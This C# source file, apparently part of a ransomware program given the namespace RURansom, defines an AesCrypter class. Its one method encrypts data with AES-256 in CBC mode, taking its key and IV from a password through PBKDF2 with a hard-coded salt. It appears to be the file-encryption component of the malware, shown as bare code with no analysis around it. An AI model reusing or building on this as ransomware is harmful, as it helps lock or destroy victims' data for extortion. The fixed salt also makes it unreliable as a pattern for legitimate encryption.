using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace RURansom;

public class AesCrypter
{
	public static byte[] AES_Encrypt(byte[] data, byte[] passwordBytes)
	{
		if (Encoding.UTF8.GetString(data) == "")
		{
			return null;
		}
		byte[] salt = new byte[8] { 54, 23, 2, 53, 23, 42, 1, 5 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 512);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(data, 0, data.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}
}
